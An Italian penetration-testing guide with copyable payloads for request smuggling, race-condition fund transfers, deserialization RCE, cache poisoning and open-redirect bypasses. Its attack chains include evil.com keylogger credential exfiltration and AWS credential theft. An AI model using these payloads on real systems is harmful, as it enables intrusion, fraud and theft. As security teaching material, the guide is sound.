---
title: 'Misc & Infrastructure Attacks: Subdomain Takeover, Race Condition, Request Smuggling'
slug: misc-infra-attacks-guida-completa
description: 'Guida completa alle vulnerabilità più sottovalutate nel pentesting web: Subdomain Takeover, HTTP Request Smuggling, Race Condition, Deserialization e Cache Poisoning. Tecniche reali, payload e attack chain enterprise.'
image: /misc-infra-attacks-guida-completa.webp
draft: true
date: 2026-03-17T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - web shell
  - deserialization
  - cache-poisoning
  - race-condition
---

Le vulnerabilità che fanno notizia sono le [SQL Injection](https://hackita.it/articoli/sql-injection), gli [Auth Bypass](https://hackita.it/articoli/auth-access-control-guida-completa), le [SSRF](https://hackita.it/articoli/ssrf). Quelle che restano aperte per anni sono **queste**: un subdomain dimenticato che punta a un servizio AWS cancellato → [Subdomain Takeover](https://hackita.it/articoli/subdomain-takeover) → phishing perfetto dal dominio aziendale. Un conflitto tra reverse proxy e backend nell'interpretazione delle request HTTP → [HTTP Request Smuggling](https://hackita.it/articoli/http-request-smuggling) → avvelena la cache per migliaia di utenti. Una race condition in un endpoint di pagamento → doppia transazione → perdita finanziaria diretta. Un oggetto serializzato non validato → [Deserialization](https://hackita.it/articoli/deserialization-attack) → RCE senza alcun upload di file.

Queste vulnerabilità hanno tre cose in comune: sono **sottovalutate**, sono **difficili da rilevare con scanner automatici**, e quando vengono sfruttate l'impatto è **devastante**. Il pentest che trova "solo" IDOR e XSS è incompleto. Il pentest che trova Request Smuggling, Race Condition sulle transazioni, e Subdomain Takeover è il pentest che salva l'azienda.

Pillar conclusivo del progetto HackIta. Vedi anche: [SQL Injection](https://hackita.it/articoli/sql-injection-guida-completa), [Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa), [File & Path Attacks](https://hackita.it/articoli/file-path-attacks-guida-completa), [Auth & Access Control](https://hackita.it/articoli/auth-access-control-guida-completa), [API & Modern Web](https://hackita.it/articoli/api-modern-web-attacks-guida-completa).

***

## Misc & Infra Attacks — Cosa Imparerai

* **Cos'è** ogni vulnerabilità misc & infra e perché è sottovalutata
* **Come trovarla** durante un pentest (discovery, fuzzing, tool specifici)
* **Come sfruttarla** con payload reali, copiabili e testati
* **Come chainarla** con altre vulnerabilità per massimizzare l'impatto
* **L'attack chain completa**: dalla discovery all'exploitation enterprise
* **Il playbook operativo**: il workflow minuto-per-minuto da seguire in ogni pentest
* **La checklist finale**: ogni test da eseguire, organizzato per categoria

***

## Misc & Infra Attacks: Le Vulnerabilità Più Comuni

| Vulnerabilità                 | Frequenza nei pentest | Impatto                              | Link                                                    |
| ----------------------------- | --------------------- | ------------------------------------ | ------------------------------------------------------- |
| **Subdomain Takeover**        | 8%                    | Phishing perfetto, cookie theft      | [→](https://hackita.it/articoli/subdomain-takeover)     |
| **HTTP Request Smuggling**    | 5%                    | Cache poisoning, auth bypass         | [→](https://hackita.it/articoli/http-request-smuggling) |
| **Clickjacking**              | 12%                   | Azioni non autorizzate               | [→](https://hackita.it/articoli/clickjacking)           |
| **Open Redirect**             | 10%                   | Phishing, token theft, SSRF chain    | [→](https://hackita.it/articoli/open-redirect)          |
| **Race Condition**            | 7%                    | Doppia transazione, bypass limiti    | [→](https://hackita.it/articoli/race-condition)         |
| **Deserialization**           | 5%                    | RCE diretta                          | [→](https://hackita.it/articoli/deserialization-attack) |
| **Web Cache Poisoning**       | 4%                    | XSS persistente su tutta l'app       | [→](https://hackita.it/articoli/cache-poisoning)        |
| **Business Logic Flaw**       | 15%                   | Financial fraud, bypass workflow     | [→](https://hackita.it/articoli/business-logic-flaw)    |
| **Clickjacking**              | 12%                   | Account takeover tramite click       | [→](https://hackita.it/articoli/clickjacking)           |
| **Security Headers Mancanti** | 30%                   | Esposizione a XSS, sniffing, framing | [→](https://hackita.it/articoli/security-headers)       |

***

## Subdomain Takeover — Il Dominio Aziendale Nelle Mani Dell'Attaccante

Il [Subdomain Takeover](https://hackita.it/articoli/subdomain-takeover) avviene quando un record DNS (CNAME) punta a un servizio esterno (AWS S3, Heroku, GitHub Pages, Azure) che **non esiste più**. L'attaccante crea quel servizio sul cloud provider → ora controlla il contenuto di `subdomain.target.com`. Phishing perfetto dal dominio dell'azienda. Cookie del dominio principale accessibili. Bypass di email security (SPF/DKIM passano).

### Discovery

```bash
# === Enumera subdomini ===
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -o subdomains_amass.txt
cat subdomains.txt subdomains_amass.txt | sort -u > all_subs.txt

# === Verifica CNAME pendenti ===
# Un CNAME che punta a un servizio non esistente = takeover possibile
cat all_subs.txt | while read sub; do
  cname=$(dig +short CNAME "$sub" 2>/dev/null)
  if [ ! -z "$cname" ]; then
    echo "$sub → $cname"
  fi
done

# === Verifica automatica con nuclei ===
nuclei -l all_subs.txt -t takeovers/ -o takeover_results.txt

# === Tool dedicato: subjack ===
subjack -w all_subs.txt -t 100 -timeout 30 -o results.txt -ssl
```

### Pattern di Takeover

```bash
# AWS S3 — il più comune
# CNAME: assets.target.com → assets-target.s3.amazonaws.com
# Il bucket S3 non esiste → chiunque può crearlo con quel nome!
curl https://assets.target.com
# "NoSuchBucket" → VULNERABILE!

# Heroku
# CNAME: app.target.com → target-app.herokuapp.com
curl https://app.target.com
# "No such app" → VULNERABILE!

# GitHub Pages
# CNAME: docs.target.com → target.github.io
curl https://docs.target.com
# 404 "There isn't a GitHub Pages site here" → VULNERABILE!

# Azure
# CNAME: portal.target.com → target-portal.azurewebsites.net
curl https://portal.target.com
# Default Azure page → VULNERABILE!

# Shopify, Zendesk, Fastly, Pantheon, Surge.sh, Tumblr...
# Ogni servizio ha il suo pattern di risposta quando non esiste
```

### Exploitation

```bash
# Esempio S3:
# 1. Crea il bucket con il nome esatto
aws s3 mb s3://assets-target
# 2. Carica la tua pagina
echo '<h1>Subdomain Takeover - HackIta PoC</h1>' > index.html
aws s3 cp index.html s3://assets-target/ --acl public-read
aws s3 website s3://assets-target --index-document index.html

# Ora assets.target.com mostra il TUO contenuto
# → Phishing perfetto
# → Ruba cookie di .target.com (se non hanno il flag Domain corretto)
```

Per approfondire: [Subdomain Takeover — guida completa](https://hackita.it/articoli/subdomain-takeover)

***

## HTTP Request Smuggling — Avvelenare Il Traffico

L'[HTTP Request Smuggling](https://hackita.it/articoli/http-request-smuggling) sfrutta la **differenza di parsing** tra il reverse proxy (Nginx, HAProxy, Cloudflare) e il backend (Apache, Node.js, Gunicorn). Se il proxy usa `Content-Length` e il backend usa `Transfer-Encoding` (o viceversa), l'attaccante può "smugglare" una seconda request nascosta dentro la prima.

### CL.TE (Content-Length vs Transfer-Encoding)

```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1
Host: target.com
...
```

Il proxy (Content-Length) vede una request di 13 bytes e la inoltra. Il backend (Transfer-Encoding chunked) legge fino a `0\r\n` (fine chunk) e tratta `GPOST...` come l'**inizio di una nuova request**. La request "G" viene preposta alla request del prossimo utente → **avvelena la request di un altro utente**.

### TE.CL (Transfer-Encoding vs Content-Length)

```
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin HTTP/1.1
Host: target.com
Content-Length: 15

x=1
0

```

### Tool — HTTP Request Smuggler (Burp Extension)

```
1. Installa "HTTP Request Smuggler" da BApp Store
2. Click destro su request → "Launch smuggle probe"
3. Lo scanner testa automaticamente CL.TE, TE.CL, TE.TE
4. Se trova un desync → exploitation manuale
```

### Impatto

```bash
# 1. Cache Poisoning — avvelena la cache per TUTTI gli utenti
# Smuggla una request che il cache memorizza con contenuto malevolo

# 2. Auth Bypass — preponi una request autenticata alla request della vittima
# La vittima riceve la response alla TUA request (con dati admin)

# 3. XSS riflessa senza interazione — inietta XSS nella request della vittima

# 4. Request routing — forza il backend a processare la request su un host diverso
```

Per approfondire: [HTTP Request Smuggling — guida completa](https://hackita.it/articoli/http-request-smuggling)

***

## Race Condition — Vincere La Corsa Per Raddoppiare

La [Race Condition](https://hackita.it/articoli/race-condition) si verifica quando due (o più) request parallele accedono alla stessa risorsa **prima che una delle due completi l'operazione**. Risultato: azioni duplicate, limiti bypassati, saldi alterati.

### Scenario Classico: Doppio Riscatto Coupon

```python
#!/usr/bin/env python3
"""race_coupon.py — Exploit race condition su coupon"""

import threading
import requests

URL = "https://target.com/api/v2/coupons/redeem"
HEADERS = {"Authorization": "Bearer YOUR_JWT", "Content-Type": "application/json"}
DATA = '{"code": "DISCOUNT50"}'
SUCCESS = []

def redeem():
    r = requests.post(URL, headers=HEADERS, data=DATA, timeout=5)
    if r.status_code == 200 and "success" in r.text.lower():
        SUCCESS.append(r.json())
        print(f"[+] REDEEMED! Balance: {r.json().get('new_balance')}")

# Lancia 50 thread simultanei
threads = [threading.Thread(target=redeem) for _ in range(50)]
for t in threads:
    t.start()
for t in threads:
    t.join()

print(f"\n[*] Total successful redemptions: {len(SUCCESS)}")
# Se > 1 → Race condition confermata!
# Il coupon monouso è stato usato N volte!
```

### Scenario Finanziario: Doppio Trasferimento

```python
# Il conto ha 1000€
# Trasferisci 800€ → il server verifica saldo >= 800 → OK
# Ma 50 request parallele passano TUTTE il check prima che il saldo sia aggiornato!
# Risultato: 50 x 800€ = 40.000€ trasferiti da un conto di 1.000€

import threading, requests

def transfer():
    r = requests.post("https://target.com/api/transfer",
        json={"to": "attacker_iban", "amount": 800},
        headers={"Authorization": "Bearer TOKEN"})
    print(r.status_code, r.text[:50])

threads = [threading.Thread(target=transfer) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
```

### Turbo Intruder (Burp)

```python
# Turbo Intruder — invia request in parallelo con timing preciso
# In Burp: Extensions → Turbo Intruder
# Script:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=1,
                          pipeline=False)
    for i in range(50):
        engine.queue(target.req)

def handleResponse(req, interesting):
    if '200' in req.response:
        table.add(req)
```

### Dove Cercare Race Condition

```bash
# Ogni operazione "monouso" o "limitata":
# - Riscatto coupon/voucher
# - Trasferimenti di denaro
# - Like/voto (1 voto per utente)
# - Registrazione con invite code
# - Riscossione reward
# - Cambio password (invalidazione vecchia sessione)
# - Join a un evento con posti limitati
```

Per approfondire: [Race Condition — guida completa](https://hackita.it/articoli/race-condition)

***

## Deserialization — RCE Da Un Cookie

La [Deserialization insicura](https://hackita.it/articoli/deserialization-attack) avviene quando l'applicazione **deserializza dati non fidati** — un cookie, un parametro, un oggetto in sessione — senza validazione. L'attaccante crea un oggetto serializzato malevolo che, quando deserializzato, esegue codice arbitrario.

### Java Deserialization (il più impattante)

```bash
# Tool: ysoserial — genera payload per ogni libreria Java
java -jar ysoserial.jar CommonsCollections1 'whoami' > payload.bin
# Invia il payload dove l'app deserializza:
# - Cookie di sessione (base64 encoded)
# - Parametro "viewstate"
# - Header custom
# - Body della request (application/x-java-serialized-object)

# Encoding per cookie/header:
cat payload.bin | base64 -w0 > payload.b64
# Inserisci in Burp nel parametro vulnerabile
```

### PHP Deserialization

```php
// Se l'app usa unserialize() su input utente:
// Payload che sfrutta __wakeup() o __destruct() di una classe vulnerabile
O:4:"Evil":1:{s:4:"data";s:20:"system('id');";}
```

### Python Pickle

```python
# pickle.loads() su dati non fidati = RCE
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
# Invia payload.hex() dove l'app chiama pickle.loads()
```

### Node.js — node-serialize

```javascript
// node-serialize: l'IIFE nel JSON viene eseguita durante la deserializzazione
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(err,stdout){/* ... */})}()"}
```

### Detection

```bash
# Java: cerca il magic byte "ac ed 00 05" nei cookie/parametri (base64 → rO0AB)
echo "COOKIE_VALUE" | base64 -d | xxd | head -1
# Se inizia con: ac ed 00 05 → Java serialized object!

# PHP: cerca pattern "O:4:" o "a:3:" nei parametri
# Python: cerca \x80\x04\x95 (pickle protocol 4)
```

Per approfondire: [Deserialization Attack — guida completa](https://hackita.it/articoli/deserialization-attack)

***

## Web Cache Poisoning — XSS Persistente Senza Database

Il [Cache Poisoning](https://hackita.it/articoli/cache-poisoning) avvelena la cache del web server/CDN facendogli memorizzare una response malevola. Ogni utente successivo che richiede la stessa pagina riceve la versione avvelenata. XSS persistente che colpisce **migliaia di utenti** senza toccare il database.

```bash
# Test: il server riflette header non in cache key?
curl -H "X-Forwarded-Host: evil.com" "https://target.com/"
# Se la response contiene "evil.com" (in un <link>, <script src>, etc.)
# E il server serve la stessa response dal cache per il prossimo utente → CACHE POISON!

# Payload:
curl -H "X-Forwarded-Host: evil.com\"><script>alert(1)</script>" "https://target.com/"
# Se la CDN cacherà questa response → ogni visitatore esegue il JS!

# Header da testare (unkeyed inputs):
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Scheme: nothttps
X-Original-URL: /admin
```

### Tool — Param Miner (Burp)

```
1. Click destro su request → "Guess headers"
2. Param Miner testa centinaia di header per trovare quelli riflessi
3. Se trova un header riflesso non in cache key → Cache Poisoning possibile
```

Per approfondire: [Web Cache Poisoning — guida completa](https://hackita.it/articoli/cache-poisoning)

***

## Business Logic Flaw — Bug Senza Payload

I [Business Logic Flaw](https://hackita.it/articoli/business-logic-flaw) sono vulnerabilità nella **logica dell'applicazione**, non nel codice tecnico. Non c'è un payload, non c'è un'injection — c'è un flusso che lo sviluppatore non ha previsto. Sono **invisibili agli scanner automatici**.

```bash
# Esempio 1: Prezzo negativo
POST /api/v2/cart/add
{"product_id": 123, "quantity": -5, "price": 100}
# Se il server calcola: -5 * 100 = -500 → il saldo dell'utente AUMENTA!

# Esempio 2: Skip step nel checkout
# Flusso normale: Cart → Address → Payment → Confirm
# Attacco: vai direttamente da Cart a Confirm senza pagare

# Esempio 3: Coupon stacking
# Applica coupon 50% → poi applica coupon 30% → 80% di sconto totale
# Lo sviluppatore ha previsto 1 coupon, non il caso di combinazione

# Esempio 4: Currency confusion
# Il prezzo è 100 USD → cambia la currency a YEN → 100 YEN = 0.67 USD

# Esempio 5: Referral abuse
# Crea account → invita te stesso con altra email → ottieni bonus → ripeti
```

### Dove Cercare Business Logic

```bash
# Ogni flusso multi-step (checkout, registrazione, KYC)
# Ogni operazione con limiti (budget, quantità, frequenza)
# Ogni calcolo finanziario (prezzo, sconto, tassa, conversione)
# Ogni sistema di reward/punti/crediti
# Ogni workflow con approvazione (richiesta → approvazione → esecuzione)
# Skip di step, inversione dell'ordine, valori negativi, valori zero
```

Per approfondire: [Business Logic Flaw — guida completa](https://hackita.it/articoli/business-logic-flaw)

***

## Open Redirect — Il Ponte Per Attacchi Più Grandi

L'[Open Redirect](https://hackita.it/articoli/open-redirect) sembra una vulnerabilità minore: `https://target.com/redirect?url=https://evil.com` porta l'utente su `evil.com`. Ma il valore reale è nella **chain**: phishing dal dominio legittimo, furto di token OAuth (redirect\_uri), bypass di filtri SSRF.

```bash
# Test:
https://target.com/redirect?url=https://evil.com
https://target.com/login?next=https://evil.com
https://target.com/logout?return=https://evil.com

# Bypass filtri:
https://target.com/redirect?url=https://evil.com%23.target.com
https://target.com/redirect?url=//evil.com
https://target.com/redirect?url=https://target.com@evil.com
https://target.com/redirect?url=https://evil.com%00.target.com
https://target.com/redirect?url=////evil.com

# Chain: Open Redirect → OAuth token theft
# L'OAuth server valida che redirect_uri inizia con https://target.com
# Ma https://target.com/redirect?url=https://evil.com è un URL di target.com!
# Il token OAuth viene inviato a target.com → che redirect a evil.com → token rubato!
```

Per approfondire: [Open Redirect — guida completa](https://hackita.it/articoli/open-redirect)

***

## Clickjacking — Il Click Invisibile

Il [Clickjacking](https://hackita.it/articoli/clickjacking) sovrappone un iframe trasparente dell'applicazione target sopra una pagina dell'attaccante. L'utente crede di cliccare sulla pagina dell'attaccante ma in realtà sta cliccando su un bottone dell'applicazione target — "Cambia email", "Trasferisci fondi", "Elimina account".

```html
<!-- evil.com -->
<style>
  iframe {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.0001;    /* Invisibile! */
    z-index: 2;
  }
  .bait {
    position: absolute;
    top: 300px; left: 200px;
    z-index: 1;
  }
</style>
<div class="bait"><h1>Clicca qui per vincere un iPhone!</h1></div>
<iframe src="https://target.com/settings/delete-account"></iframe>
<!-- L'utente clicca "Vincere iPhone" → in realtà clicca "Elimina account"! -->
```

### Test

```bash
# Controlla se il sito può essere incluso in iframe:
curl -s -I "https://target.com" | grep -i "x-frame-options\|content-security-policy"

# Se manca X-Frame-Options e CSP frame-ancestors → Clickjacking possibile!
# X-Frame-Options: DENY → protetto
# X-Frame-Options: SAMEORIGIN → protetto (solo stesso dominio)
# Content-Security-Policy: frame-ancestors 'none' → protetto
```

Per approfondire: [Clickjacking — guida completa](https://hackita.it/articoli/clickjacking)

***

## Security Headers Mancanti — La Difesa Che Costa Zero

I [Security Headers](https://hackita.it/articoli/security-headers) sono header HTTP che attivano protezioni nel browser. La loro assenza non è una vulnerabilità diretta ma **amplifica ogni altra vulnerabilità**. Li trovo mancanti nel **30% dei pentest**.

```bash
# Scan completo:
curl -s -I "https://target.com" | grep -iE "x-frame|x-content|strict-transport|content-security|x-xss|referrer-policy|permissions-policy"

# Tool: securityheaders.com (scan online)
# Tool: shcheck
shcheck.py https://target.com

# Header critici:
# Content-Security-Policy → previene XSS
# X-Frame-Options → previene Clickjacking
# Strict-Transport-Security → forza HTTPS
# X-Content-Type-Options: nosniff → previene MIME sniffing
# Referrer-Policy → previene leak URL nel Referer
# Permissions-Policy → limita API browser (camera, geolocation)
```

Per approfondire: [Security Headers — guida completa](https://hackita.it/articoli/security-headers)

***

## Attack Chain Reale — Dalla Discovery Al Compromise (Step-by-Step)

Questa è la chain che uso nei pentest quando le vulnerabilità "classiche" non bastano:

### Chain 1: Subdomain Takeover → Cookie Theft → Account Takeover

```
1. subfinder → 200 subdomini → nuclei takeovers/ → staging.target.com CNAME dangling
2. Claim su Heroku → staging.target.com sotto mio controllo
3. Pagina JS su staging.target.com che legge document.cookie
4. Cookie di sessione di .target.com accessibili (domain=.target.com)
5. Cookie rubati → Session Hijacking → Account Takeover
```

### Chain 2: Open Redirect → OAuth Token Theft → Admin Access

```
1. Open redirect su https://target.com/redirect?url=
2. OAuth flow con redirect_uri=https://target.com/redirect?url=https://evil.com
3. L'OAuth server valida target.com → manda auth code a target.com
4. target.com redirect a evil.com → auth code catturato
5. Auth code → access token → API con permessi admin
```

### Chain 3: Cache Poisoning → XSS Massivo → Credential Harvesting

```
1. Param Miner → header X-Forwarded-Host riflesso nella response
2. X-Forwarded-Host: evil.com"><script src=//evil.com/steal.js>
3. La CDN cacherà la response avvelenata
4. Ogni visitatore carica steal.js → keylogger sulla login page
5. Credenziali di centinaia di utenti inviate a evil.com
```

### Chain 4: Race Condition + IDOR → Financial Fraud

```
1. IDOR su /api/transfers → vedo trasferimenti di altri utenti
2. Race condition su /api/coupons/redeem → coupon monouso usato 50 volte
3. Saldo aumentato di 50x il valore del coupon
4. Trasferimento dei fondi a conto esterno
5. FINANCIAL FRAUD DIRETTO
```

### Chain 5: Deserialization → RCE → Infrastructure

```
1. Cookie con pattern rO0AB (Java serialized) identificato
2. ysoserial → payload CommonsCollections → RCE
3. RCE → cat /proc/self/environ → AWS creds
4. aws s3 ls → bucket con backup → database dump
5. COMPROMISSIONE INFRASTRUTTURA COMPLETA
```

***

## Misc & Infra Pentesting: Playbook Operativo (Step-by-Step)

Questo è il workflow che seguo in ogni pentest **dopo** aver testato le vulnerabilità "classiche" (injection, auth, file):

### Fase 1 — Infrastructure Recon (minuto 0-15)

```bash
# Subdomain enumeration
subfinder -d target.com -o subs.txt
# Subdomain takeover check
nuclei -l subs.txt -t takeovers/
# Security headers check
curl -s -I https://target.com | grep -i "x-frame\|csp\|hsts"
# Technology fingerprint
whatweb https://target.com
```

### Fase 2 — HTTP Layer (minuto 15-30)

```bash
# Request Smuggling probe
# Burp → HTTP Request Smuggler → Launch smuggle probe
# Oppure: smuggler.py (tool Python)

# Clickjacking test
# curl -I → manca X-Frame-Options? → PoC con iframe

# Open Redirect
# Cerca parametri: url=, next=, redirect=, return=, callback=
# Testa con https://evil.com
```

### Fase 3 — Application Logic (minuto 30-50)

```bash
# Race Condition su ogni operazione monouso/limitata
# Turbo Intruder con 50 request parallele

# Business Logic
# Testa valori negativi, zero, estremi
# Testa skip di step nei workflow multi-step
# Testa stacking di coupon/promozioni

# Deserialization
# Cerca pattern rO0AB (Java), O:4: (PHP), \x80\x04 (Python pickle)
# In cookie, parametri, header
```

### Fase 4 — Cache & CDN (minuto 50-60)

```bash
# Cache Poisoning
# Burp Param Miner → Guess headers
# Testa X-Forwarded-Host, X-Host, X-Forwarded-Scheme

# Cache key normalization
# Testa URL con parametri extra: ?x=1, ?utm_source=test
# Se la response è cachata con il parametro → cache key deception
```

***

## Caso Studio Concreto

**Settore:** Banking online, 300.000 clienti, infrastruttura multi-cloud.
**Scope:** Grey-box.

Le vulnerabilità "classiche" (SQLi, XSS, IDOR) erano state fixate nel pentest precedente. Il cliente si sentiva sicuro. Ho trovato:

**Subdomain Takeover:** `api-staging.bank.com` → CNAME a un'istanza Heroku cancellata. Ho registrato l'app su Heroku → controllo completo del subdomain. Il cookie di sessione aveva `domain=.bank.com` → rubabile da `api-staging.bank.com`.

**Race Condition sulle transazioni:** L'endpoint `/api/v2/transfer` verificava il saldo e poi aggiornava. Con 30 request parallele di trasferimento da 5.000€ su un conto di 10.000€, **4 transazioni passavano** → 20.000€ trasferiti da un conto di 10.000€.

**HTTP Request Smuggling:** Il reverse proxy Nginx e il backend Node.js interpretavano `Transfer-Encoding` diversamente. CL.TE smuggling → avvelenamento della cache della homepage con un redirect al mio server → ogni visitatore per 60 secondi veniva rediretto.

**Impatto combinato:** Race condition → 10.000€ di perdita finanziaria per test. Subdomain takeover → cookie theft → session hijacking di qualsiasi utente. Cache poisoning → phishing massivo di 300.000 clienti.

**Tempo: 3 ore per la compromissione totale — zero SQL injection, zero XSS, zero IDOR.**

***

## Errori Comuni Reali

**1. "Abbiamo fixato OWASP Top 10, siamo sicuri"** — Race condition, business logic, subdomain takeover non sono nell'OWASP Top 10.

**2. CNAME dimenticati dopo decommissioning** — il servizio viene cancellato ma il DNS record resta.

**3. Operazioni finanziarie senza locking** — il codice verifica il saldo e poi aggiorna, ma tra verifica e aggiornamento passano millisecondi sfruttabili.

**4. Header non in cache key riflessi nella response** — `X-Forwarded-Host` riflesso nel `<link>` o `<script src>` senza essere nella cache key.

**5. Deserializzazione di cookie/sessione senza validazione** — "è solo un cookie, cosa può succedere?" → RCE.

***

## Indicatori di Compromissione (IoC)

* CNAME che puntano a servizi non esistenti (check periodico DNS)
* Request con `Transfer-Encoding: chunked` + `Content-Length` contemporanei
* Transazioni duplicate con timestamp quasi identico (race condition)
* Valori negativi o zero nei parametri finanziari nei log
* Header anomali nelle request (`X-Forwarded-Host`, `X-Host`) con valori esterni
* Oggetti serializzati (base64 con pattern noti) in parametri non previsti

***

## ✅ Checklist Misc & Infra Pentest

```
SUBDOMAIN TAKEOVER
☐ Subdomini enumerati (subfinder, amass)
☐ CNAME pendenti identificati
☐ nuclei takeovers/ eseguito
☐ Pattern di takeover verificati (S3, Heroku, GitHub Pages, Azure)

HTTP REQUEST SMUGGLING
☐ CL.TE testato
☐ TE.CL testato
☐ TE.TE testato
☐ Burp HTTP Request Smuggler eseguito

RACE CONDITION
☐ Operazioni monouso identificate (coupon, trasferimenti, voti)
☐ 50 request parallele inviate (Turbo Intruder / threading)
☐ Duplicazioni verificate

DESERIALIZATION
☐ Cookie/parametri con oggetti serializzati identificati (rO0AB, O:4:)
☐ ysoserial/PHP gadget chain testati
☐ Pickle injection testata

CACHE POISONING
☐ Param Miner → header non in cache key cercati
☐ X-Forwarded-Host riflesso testato
☐ Cache key deception testata

BUSINESS LOGIC
☐ Valori negativi testati
☐ Skip step nei workflow testato
☐ Coupon stacking testato
☐ Currency/timezone confusion testata

OPEN REDIRECT
☐ Parametri redirect (url=, next=, return=) testati
☐ Bypass filtri testati (//evil.com, %00, @)
☐ Chain con OAuth redirect_uri documentata

CLICKJACKING
☐ X-Frame-Options presente?
☐ CSP frame-ancestors presente?
☐ PoC iframe creato se mancanti

SECURITY HEADERS
☐ Content-Security-Policy
☐ Strict-Transport-Security
☐ X-Content-Type-Options
☐ X-Frame-Options
☐ Referrer-Policy
☐ Permissions-Policy
```

***

## Mappa del Cluster Misc & Infra

| Articolo               | Tipo             | Impatto                      | Link                                                    |
| ---------------------- | ---------------- | ---------------------------- | ------------------------------------------------------- |
| **Questa guida**       | PILLAR           | —                            | —                                                       |
| Subdomain Takeover     | DNS exploitation | Phishing, cookie theft       | [→](https://hackita.it/articoli/subdomain-takeover)     |
| HTTP Request Smuggling | HTTP desync      | Cache poisoning, auth bypass | [→](https://hackita.it/articoli/http-request-smuggling) |
| Race Condition         | Timing attack    | Financial fraud              | [→](https://hackita.it/articoli/race-condition)         |
| Deserialization Attack | Object injection | RCE                          | [→](https://hackita.it/articoli/deserialization-attack) |
| Web Cache Poisoning    | Cache abuse      | Persistent XSS               | [→](https://hackita.it/articoli/cache-poisoning)        |
| Business Logic Flaw    | Logic abuse      | Financial fraud              | [→](https://hackita.it/articoli/business-logic-flaw)    |
| Open Redirect          | Redirect abuse   | Token theft                  | [→](https://hackita.it/articoli/open-redirect)          |
| Clickjacking           | UI redressing    | Unauthorized actions         | [→](https://hackita.it/articoli/clickjacking)           |
| Security Headers       | Misconfiguration | Amplifica altre vuln         | [→](https://hackita.it/articoli/security-headers)       |

Vedi anche: [SQL Injection](https://hackita.it/articoli/sql-injection-guida-completa), [Auth & Access Control](https://hackita.it/articoli/auth-access-control-guida-completa), [API & Modern Web](https://hackita.it/articoli/api-modern-web-attacks-guida-completa).

***

> Le vulnerabilità "classiche" sono fixate ma il subdomain è takeover-abile? Le transazioni reggono 50 request parallele? Il CDN è avvelenabile? [Penetration test infrastrutturale HackIta](https://hackita.it/servizi) per trovare le vulnerabilità che gli scanner non vedono. Dalla race condition al cache poisoning: [formazione 1:1](https://hackita.it/formazione).
